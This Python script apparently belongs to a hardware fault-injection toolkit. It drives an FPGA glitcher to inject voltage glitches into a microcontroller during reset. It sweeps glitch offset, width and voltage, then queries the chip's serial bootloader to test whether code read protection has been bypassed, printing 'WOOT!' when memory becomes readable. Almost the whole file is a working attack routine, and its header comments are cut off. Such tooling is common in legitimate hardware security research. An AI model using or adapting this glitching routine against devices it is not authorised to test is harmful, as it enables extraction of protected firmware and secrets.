###############################################################################
# This example shows how to 
# Partially based on 
# The example uses the 
# For this to work, the following connections and changes are needed:
#

#
###############################################################################

import time
import serial as ser
import uu
from glitcher import glitcher
import logging
from fpga import *
from gpio import gpio

# Change this depending on your setup
SER_PORT = "com7"


def open_port(serial, baud):
    logging.info(f"Serial communication opened on port {serial} at {baud} baud.")
    return ser.Serial(serial, baud, timeout=0.2)

def expect_read(serial, expected):
    result = ""
    # Don't attempt to read more than 1 times
    for i in range(0, 1):
        result += serial.read(len(expected)).decode('ascii', 'ignore')
        if expected in result:
            return None;

    print("! Expected = " + repr(expected) + " got " + repr(result))
    return result

def read_address(serial, address, length):
    cmd = 'R {:d} {:d}\r\n'.format(address, length)
    serial.write(cmd.encode())

    result = ""
    # Don't attempt to read more than 1 times
    for i in range(0, 1):
        result += serial.read(61).decode('ascii', 'ignore')
        if '\r\n' in result:
            break
    
    # Check if command succeeded.
    if '\r0\r\n' in result and not('\r09' in result):
        serial.write(b'OK\r\n')
        expect_read(serial, 'OK\r\n')
        return result
    
    print(repr(result), end = " - ")

    return None

def check_protected(serial, khz, debugPrint):

    # Syncing the device
    serial.write(b"?")
    
    if debugPrint:
        print("Synchronization handshake initiated... ")

    if serial.readline() == b"Synchronized" + EOL:
        serial.write(b"Synchronized" + EOL)
    else:
        if debugPrint:
            print("Synchronization failed. No response from target device.")
        return False

    clk = str(khz).encode('UTF-8')   
    if serial.readline() == b"Synchronized\rOK" + EOL:
        
        if debugPrint:
            print("Synchronized with target device.")
            print("Setting device clock freq... ")

        serial.write(clk + EOL)
    else:
     
        if debugPrint:
            print("Synchronization failed. Target aborted synchronization.")
            
        return False

    if serial.readline() == clk + b"\rOK" + EOL:
        if debugPrint:
            print("Clock frequency set at %.3f Mhz" % (khz / 1000.0))
    else:
        if debugPrint:
            print("Failed to set clock frequency to %.3f Mhz" % (khz / 1000.0))
            
        return False
  
    if debugPrint:
        print("Communications setup with target device succeeded.")

    # Check if protected
    r = read_address(serial, 0, 4)
    
    if r is None:
        return PROTECTED
    else:
        print("!!! Yeah, unprotected !!!")
        print(repr(r))
        return UNPROTECTED
        
    return (r == None)

def close_port(serial):
    serial.close()


if __name__=="__main__":
    port = open_port(SER_PORT, 9600)
    
    logging.basicConfig(level = logging.INFO)

    glitcher = glitcher()
    glitcher.reset_fpga() 
    glitcher.dac.setTestModeEnabled(0)
    glitcher.dac.setRfidModeEnabled(0)
    
    io = gpio()
    io.setInternalOutput(GPIO_Pins.GPIO0.value, False);
    io.setPinMux(GPIO_Pins.GPIO6.value, GPIO_Select_Bits.GPIO_OUTPUT_0.value)
    io.updateMuxState()

    # Setup trigger on this internal output (which is also on GPIO1_6)
    glitcher.dac.setTriggerEnableState(Register_Bits.FI_TRIGGER_GPIO_OUTPUT_0.value, True)
    
    # Set the fault voltage, normal voltage, off voltage
    glitcher.set_voltages(0.5, 1.9, 0)
    glitcher.dac.setEnabled(True)
    
    # Limits
    
    # Offsets
    offset_start = 52700
    offset_end = 53200
    offset_step = 100
    
    # Width range
    w_start = 100
    w_end = 270
    w_step = 10
    
    # Voltage range
    v_start = 0.1
    v_end = 0.7
    v_step = 0.1
    v_normal = 1.75
    
    # Repeat each attempt how many times?
    repeat = 20
    
    # Loop state
    run = True
    w = w_start
    offset = offset_start
    v = v_start
    r = 0
    
    glitcher.set_voltages(v, v_normal, 0)
    
    while run:
        
        # Bring uc into reset
        io.setInternalOutput(GPIO_Pins.GPIO0.value, False);
        time.sleep(0.05)
        
        # Clean up any previous pulses
        glitcher.dac.clearPulses()
    
        # Set a pulse
        glitcher.add_pulse(offset, w)
        
        # Arm the fault
        glitcher.dac.arm()
        
        # Bring uc out of reset - this will also trigger the glitch
        io.setInternalOutput(GPIO_Pins.GPIO0.value, True);
        time.sleep(0.05)
        
        # Now check if we succeeded
        status = check_protected(port, 12000, False);
        
        if status == False:
            print("Communication failed, restarting")
        elif status == PROTECTED:
            print("Protected, next param")
            print("v = {:f}, w = {:d}, o = {:d}, repeat = {:d}".format(v, w, offset, r))
            
            # Next param
            if r < repeat:
                r = r + 1
            elif w < w_end:
                r = 0
                w = w + w_step
            elif offset < offset_end:
                w = w_start
                offset = offset + offset_step
            elif v < v_end:
                offset = offset_start
                w = w_start
                v = v + v_step
                glitcher.set_voltages(v, v_normal, 0)
            else:
                run = False
            
        elif status == UNPROTECTED:
            print("WOOT!")
            print("v = {:f}, w = {:d}, o = {:d}".format(v, w, offset))
            run = False
        else:
            print("Invalid return value!")
    
    close_port(port)
    glitcher.close()




